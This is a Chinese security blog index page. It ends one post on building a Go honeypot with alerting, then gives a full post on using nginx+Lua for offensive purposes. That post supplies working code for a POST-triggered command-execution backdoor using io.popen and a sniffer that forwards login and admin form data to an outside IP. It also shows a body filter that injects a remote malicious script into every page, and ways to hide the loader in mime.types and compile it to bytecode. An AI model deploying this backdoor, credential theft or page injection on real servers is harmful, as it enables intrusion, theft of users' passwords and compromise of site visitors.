                    subject := fmt.Sprintf(&quot;[蜜罐报警]%v, 截获来自%v:%v对%v:%v的攻击(%v)&quot;, mailContent.Timestamp, src, ret[&quot;spt&quot;], ret[&quot;dst&quot;], ret[&quot;dpt&quot;], ret[&quot;proto&quot;])
                    // body, _ := json.MarshalIndent(logParts, &quot;&quot;, &quot;\t&quot;)
                    t, _ := template.New(&quot;mail&quot;).Parse(helper.HtmlMail)
                    var body bytes.Buffer
                    t.Execute(&amp;body, mailContent)

                    // Alarm info, save to es too
                    var alarmInfo helper.AlarmInfo
                    alarmInfo.Client = client
                    alarmInfo.EsIndex = es_info.Index
                    alarmInfo.EsDocument = es_info.DocumentAlarm
                    alarmInfo.Id = id
                    alarmInfo.LogParts = logParts

                    go helper.Alarm(redisConfig, logParts, subject, fmt.Sprintf(&quot;%s&quot;, body.String()), mail_config, alarmInfo)
                    
                    go helper.InsertElastic(*client, es_info.Index, es_info.Document, id, logParts)
                }
            }
            // log.Println(strings.Repeat(&quot;-&quot;, 70))
        }
    }(channel)

    server.Wait()
}

</code></pre>

<p>蜜罐的测试效果：
<img src="/media/images_honeypot/honeypot.png" alt="honeypot" /></p>

<h2 id="扩展功能">扩展功能</h2>

<p>以上的Agent放在重要系统的内网网段为一个支持所有协议和端口的蜜罐，其实也可以改为一个适用于小网站的防火墙放在外网。
做成防火墙需要做的改动如下：</p>

<ol>
<li>去掉数据转发到后端的功能</li>
<li>设计防火墙策略（以下仅为举例，正式使用的话，需要根据对不同的端口的攻击设置不同的频率）例如：

<ol>
<li>如果1分钟内同一个IP的请求超过100，可以将攻击者的所有请求转到一个欺骗的地址（镜花水月）</li>
<li>如果1分钟内同一个IP的请求超过300，可以将攻击者的所有请求原封不动的反弹回去（斗转星移）</li>
<li>如果1分钟内同一个IP的请求超过600，直接将攻击者的IP Block掉，禁止访问。</li>
</ol></li>
</ol>

<h2 id="参考资料">参考资料</h2>

<ol>
<li><a href="https://n0where.net/how-does-it-work-iptables/">How Does It Work: IPTables</a></li>
<li><a href="http://txgcwm.github.io/blog/2013/07/25/linuxxia-iptablesfang-huo-qiang-yuan-li-ji-shi-yong/">Linux下iptables防火墙原理及使用</a></li>
<li><a href="https://segmentfault.com/a/1190000002540601">iptables防火墙原理详解</a></li>
</ol>
</section>
                        <aside class="aside clearfix">
                            <a class="btn btn-primary btn-lg pull-right" href="/2016/7/8/how-to-develop-a-honeypot.html">Read More</a>
                        </aside>
                    </div>
                </div>
            </article>
            
            <article class="article">
                <div class="row">
                    <div class="col-md-10 col-md-offset-1 panel panel-default">
                        <header class="header">
                            <div class="meta">
                        <span class="date">
                            <span class="month">7</span>
                            <span class="day">8</span>
                        </span>
                            </div>
                            <h3 class="title">
                                <a href="/2016/7/8/nginx-lua-security.html">nginx-lua-security</a>
                            </h3>
                        </header>
                        <section class="brief"><p>时隔半年后，我终于又写了篇blog，知乎专栏的地址为：
<a href="https://zhuanlan.zhihu.com/p/21362834">浅谈nginx + lua在安全中的一些应用</a></p>

<h2 id="浅谈nginx-lua在安全中的一些应用">浅谈nginx + lua在安全中的一些应用</h2>

<h3 id="概要">概要</h3>

<p>nginx是一个用C语言开发的高性能WEB服务器及反向代理服务器，直接使用c/c++进行二次开发，对于很多用户是有一定门槛的，且c/c++的开发效率也比不上python、js、lua等语言，python、js、lua 三者中，lua 是解析器最小，性能最高的语言，luajit比lua 又快数10倍。目前将nginx和lua 结合在一起的有春哥维护的<a href="http://openresty.org/cn/">openresty</a>和淘宝维护的<a href="http://tengine.taobao.org/">Tengine</a>。</p>

<ol>
<li><p>最先将Nginx，Lua组合到一起的是OpenResty，春哥提供了一个<a href="https://github.com/openresty/lua-nginx-module">lua-nginx-module模块</a>，可以将Lua嵌入到了Nginx里面， 锤子T2发布会上捐赠的项目就是春哥的openresty；</p></li>

<li><p>随后Tengine fork了nginx的一个分支，也包含了<a href="https://github.com/openresty/lua-nginx-module">lua-nginx-module模块</a>。</p></li>
</ol>

<h4 id="openresty与tengine的区别">openresty与tengine的区别：</h4>

<ol>
<li><p>OpenResty是Nginx的Bundle，与官方的最新版本是同步的</p></li>

<li><p>Tengine则是Nginx 1.6.2版本的Fork, 阿里根据自己的业务情况对nginx进行了一些定制开发</p></li>
</ol>

<h4 id="nginx-lua-的应用场景">nginx + lua 的应用场景</h4>

<p>OpenResty通过汇聚各种设计精良的 Nginx 模块（主要由 OpenResty 团队自主开发），从而将 Nginx 有效地变成一个强大的通用 Web 应用平台，在WEB应用与信息安全领域均有广泛的应用：</p>

<ol>
<li><p>业务部门可以用其快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统，具体的应用场景可以参考<a href="http://www.iresty.com/">OpenResty Con 2015</a>，目前基于openresty的web框架有以下几种：</p>

<ol>
<li><a href="https://github.com/leafo/lapis">https://github.com/leafo/lapis</a></li>
<li><a href="https://github.com/idevz/vanilla">https://github.com/idevz/vanilla</a></li>
<li><a href="https://github.com/sumory/lor">https://github.com/sumory/lor</a></li>
<li><a href="https://github.com/dualface/gbc-core（游戏后端框架）">https://github.com/dualface/gbc-core（游戏后端框架）</a></li>
</ol></li>

<li><p>安全从业人员经常用来写waf、安全代理（身份认证、敏感信息删除等）</p></li>
</ol>

<p>本文先写一些偏渗透方面的，主要包括以下几个方面：</p>

<ol>
<li>后门</li>
<li>数据监听、窃取</li>
<li>挂马</li>
<li>lua代码加密及隐蔽</li>
</ol>

<h3 id="安装">安装</h3>

<h4 id="openresty和tengine">openresty和tengine</h4>

<p>openresty和tengine默认已经集成了lua的功能，安装过程比较方便。</p>

<ol>
<li>openresty的安装
<code>
tar xzvf ngx_openresty-VERSION.tar.gz
cd ngx_openresty-VERSION/
./configure
gmake
gmake install
</code></li>
<li>tengine的安装
<code>
wget http://tengine.taobao.org/download/tengine-2.1.2.tar.gz
tar -zxvf tengine-2.1.2.tar.gz
cd tengine-2.1.2
./configure
make
make install
</code></li>
</ol>

<h4 id="为nginx安装lua-nginx-module">为nginx安装lua-nginx-module</h4>

<p>为nginx安装lua-nginx-module分为以下几个步骤：</p>

<ol>
<li>安装LuaJIT 2.0或2.1或 lua 5.1（5.2以上版本不支持）</li>
<li>下载ngx_devel_kit、 ngx_lua</li>
</ol>

<p>编译安装过程如下：</p>
<pre><code class="language-shell">wget 'http://nginx.org/download/nginx-1.9.15.tar.gz'
 tar -xzvf nginx-1.9.15.tar.gz
 cd nginx-1.9.15/
 export LUAJIT_LIB=/path/to/luajit/lib
 export LUAJIT_INC=/path/to/luajit/include/luajit-2.1
 ./configure --prefix=/opt/nginx \
         --with-ld-opt=&quot;-Wl,-rpath,/path/to/luajit-or-lua/lib&quot; \
         --add-module=/path/to/ngx_devel_kit \
         --add-module=/path/to/lua-nginx-module
 make -j2
 make install
</code></pre>

<p>nginx 1.9.11及以后的版本支持动态加载模块，将ngx_devel_kit、 ngx_lua编译为.so文 件，通过load_module指令就可以加载到nginx中了，</p>
<pre><code class="language-shell">load_module /path/to/modules/ndk_http_module.so;  # assuming NDK is built as a dynamic module too
load_module /path/to/modules/ngx_http_lua_module.so;
</code></pre>

<p>将nginx模块编译为动态模块的方法可以参考：<a href="https://www.nginx.com/resources/wiki/extending/converting/">https://www.nginx.com/resources/wiki/extending/converting/</a>
在实际的应用中，如果目标网站中是原生的nginx，我们也可以考虑用nginx -V命令获取到目标网站的编译参数，然后在本地虚拟机中编译一个相同版本、带有lua模块的nginx二进制文件替换到目标站点的。</p>

<h3 id="后门">后门</h3>

<p>在nginx.conf文件中的http节中加入如下内容：</p>
<pre><code class="language-shell">http {
  include       mime.types;
  # lua 文件的位置
  lua_package_path &quot;/usr/local/openresty/nginx/conf/lua_src/?.lua;;&quot;;
  # nginx启动阶段时执行的脚本，可以不加
  init_by_lua_file 'conf/lua_src/Init.lua';
</code></pre>

<p>conf/lua_src/Init.lua中的内容如下：</p>
<pre><code class="language-lua">local p = &quot;/usr/local/openresty/nginx/conf/lua_src&quot;
local m_package_path = package.path
package.path = string.format(&quot;%s?.lua;%s?/init.lua;%s&quot;, p, p, m_package_path)
cmd = require(&quot;t&quot;)
</code></pre>

<p>cmd = require(&ldquo;t&rdquo;)表示加载了t.lua中的模块，并命名为cmd，以后在nginx的所有执行阶段通过cmd变量就可以调用了。
t.lua实现了一个简单的命令执行功能，如下所示：</p>
<pre><code class="language-lua">local _M = {}
function _M.run()
    ngx.req.read_body()
    local post_args = ngx.req.get_post_args()
    -- for k, v in pairs(post_args) do
    --    ngx.say(string.format(&quot;%s = %s&quot;, k, v))
    -- end
    local cmd = post_args[&quot;cmd&quot;]
    if cmd then
        f_ret = io.popen(cmd)
        local ret = f_ret:read(&quot;*a&quot;)
        ngx.say(string.format(&quot;reply:\n%s&quot;, ret))
    end
end
return _M
</code></pre>

<p>nginx有11个处理阶段，如下图所示：
<img src="/media/images/000.png" alt="" />
一般我们在开发过程中常用到的阶段如下：</p>

<ol>
<li>set_by_lua*: 流程分之处理判断变量初始化</li>
<li>rewrite_by_lua*: 转发、重定向、缓存等功能(例如特定请求代理到外网)</li>
<li>access_by_lua*: IP准入、接口权限等情况集中处理(例如配合iptable完成简单防火墙)</li>
<li>content_by_lua*: 内容生成</li>
<li>header_filter_by_lua*: 应答HTTP过滤处理(例如添加头部信息)</li>
<li>body_filter_by_lua*: 应答BODY过滤处理(例如完成应答内容统一成大写)</li>
<li>log_by_lua*: 回话完成后本地异步完成日志记录(日志可以记录在本地，还可以同步到其他机器)</li>
</ol>

<p>一般情况下，我们使用content阶段即可，以下的例子为把content_by_lua放到server段的/test/ location下</p>
<pre><code class="language-shell">1     location /test/ {
2       content_by_lua '
3       cmd.run()
4       ';
5     }
</code></pre>

<p>执行效果如图所示：
<img src="/media/images/001.png" alt="" />
如果将content_by_lua改为access_by_lua（content阶段不允许放在http节）放到http段表示为一个全局的后门，随便一个url，只要传入我们特定的参数，nginx就会响应，即便是404的页面也可以，如下图的所示：
<img src="/media/images/002.png" alt="" /></p>

<h3 id="数据监听-窃取">数据监听、窃取</h3>

<p>nginx实现数据监听非法方便，只要以下ngx.req.read_body()和local post_args = ngx.req.get_post_args()2行代码即可，
再利用lua-resty-http模块就可以将数据通过post的方式提交到黑阔指定的地方，测试代码如下：</p>
<pre><code class="language-lua">local http = require &quot;resty.http&quot;
local cjson = require(&quot;cjson&quot;)

local _M = {}

function _M.sniff()
    ngx.req.read_body()
    local post_args = ngx.req.get_post_args()
    ngx.log(ngx.DEBUG, &quot;data=&quot; .. cjson.encode(post_args))
    if post_args then
        local httpc = http.new()
        local res, err = httpc:request_uri(&quot;http://111.111.111.111/test/&quot;, {
            method = &quot;POST&quot;,
            body = &quot;data=&quot; .. cjson.encode(post_args),
            headers = {
            [&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;,
        }
        })
    end
end

return _M
</code></pre>

<p>然后用tornado写个接受post参数的web程序，测试代码及效果如下：
<img src="/media/images/003.png" alt="" />
如果将监听的代码放到nginx的http段中，表示全局监听并窃取post数据，这样黑阔就会收到所有的post数据请求，对目标服务器的性能也有影响。</p>
<pre><code class="language-shell">access_by_lua 'cmd.sniff() ';
</code></pre>

<p>最佳的做法是放到目标站点的关键的location中，比如/login、/admin等，需要注意的是lua-resty-http是基于cosocket实现的，所以不能放在以下几个阶段
set_by_lua<em>, log_by_lua</em>, header_filter_by_lua*, body_filter_by_lua。</p>

<p>如果只想记录正确的密码，过滤掉错误的，就需要在header_filter_by_lua或body_filter_by_lua阶段，通过服务器返回的值来判断用户post提交的密码是否正确，这个时候如果想提交到服务器中的话，就不能使用lua-resty-http了，但是可以通过ngx.timer.at 以异步的方式提交。
另外也可以使用第三方的模块lua-requests在header_filter_by_lua或body_filter_by_lua阶段提交数据，利用luarocks为openresty安装lua-requests的过程如下：</p>
<pre><code class="language-shell">wget http://luarocks.org/releases/luarocks-2.0.13.tar.gz
tar -xzvf luarocks-2.0.13.tar.gz
cd luarocks-2.0.13/
./configure --prefix=/usr/local/openresty/luajit \
    --with-lua=/usr/local/openresty/luajit/ \
    --lua-suffix=jit-2.1.0-alpha \
    --with-lua-include=/usr/local/openresty/luajit/include/luajit-2.1
make
sudo make install

sudo /usr/local/openresty/luajit/luarocks install lua-requests
</code></pre>

<h3 id="挂马">挂马</h3>

<p>在nginx返回数据时，将网页木马插入即可，代码如下：</p>
<pre><code class="language-lua">function _M.hang_horse()
    local data = ngx.arg[1] or &quot;&quot;
    local html = string.gsub(data, &quot;&lt;/head&gt;&quot;, &quot;&lt;script src=\&quot;http://docs.xsec.io/1.js\&quot;&gt;&lt;/script&gt;&lt;/head&gt;&quot;)
    ngx.arg[1] = html
end
</code></pre>

<p>放到目标网站的/目录下后的效果如下：</p>
<pre><code class="language-shell">location ~* ^/ {
    body_filter_by_lua 'cmd.hang_horse()';
</code></pre>

<p><img src="/media/images/004.png" alt="" /></p>

<h3 id="lua代码加密及隐藏">Lua代码加密及隐藏</h3>

<h3 id="lua加载代码隐藏">lua加载代码隐藏</h3>

<p>毕竟光明正大地在nginx.conf中加入了执行lua的代码后非常容易被发现，攻击者可以用include指令将以下代码改得隐蔽一些。</p>
<pre><code class="language-shell">http {
  include       mime.types;
  # lua 文件的位置
  lua_package_path &quot;/usr/local/openresty/nginx/conf/lua_src/?.lua;;&quot;;
  # nginx启动阶段时执行的脚本，可以不加
  init_by_lua_file 'conf/lua_src/Init.lua';
</code></pre>

<p>改成以下的内容，看起来与之前的配置完全一样，把加载lua的代码放到mime.types文件中，mime.types是一般用nginx默认的，一般很少有人去查看或改动其内容。</p>
<pre><code class="language-shell">http {
  include       mime.types;
</code></pre>

<h3 id="lua代码加密">lua代码加密</h3>

<p>即便是把lua加载的配置代码放在隐蔽的地方了，但是还在存在被找到的风险的，找到后如果是明文的lua代码，那行踪将暴露的一览无余，至少将lua代码加密一下。
openresty使用的是luajit，luajit提供了一个luajit -b参数，可以将代码编译为字节码，这样就不容易被看到明文代码了。</p>

<p>使用方式如下图所示（openresty的luajit的默认路径为<code>/usr/local/openresty/luajit/bin/luajit</code>），用编译后的lua字节码替换掉明文的文件即可。
<img src="/media/images/005.png" alt="" /></p>

<h3 id="总结">总结</h3>

<p>拿到目标主机的root权限后，只留一个只有web容器权限的nginx+lua后门显然不是最佳的选择，本文只是提供一种可能的思路，测试代码的github地址为：<a href="https://github.com/netxfly/nginx_lua_security">https://github.com/netxfly/nginx_lua_security</a></p>

<p>虽然很low，但just for share&hellip;</p>
</section>
                        <aside class="aside clearfix">
                            <a class="btn btn-primary btn-lg pull-right" href="/2016/7/8/nginx-lua-security.html">Read More</a>
                        </aside>
                    </div>
                </div>
            </article>
            
            <div class="article-pager text-center">
                
                
            </div>
        </div>
    </div>
</section>
<footer id="footer">
    <div class="container text-center">
        <p>© 2015 记录人生旅程中的迷茫与探索.
            <a href="http://creativecommons.org/licenses/by/3.0/">Some rights reserved </a> |
            <a href="/feed.xml">Feed</a> |
            <a href="/sitemap.xml">Sitemap</a>
        </p>
        <p>Powered by <a href="https://github.com/go-xiaohei/pugo">PuGo 0.10.0 (beta)</a>. Theme by Default.
        </p>
        
    
    

    </div>
</footer>
<script src="/js/jquery-2.1.4.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/prism.min.js"></script>
<script>
    $(document).ready(function () {
        $("pre code").addClass("line-numbers")
    });
</script>
</body>
</html>
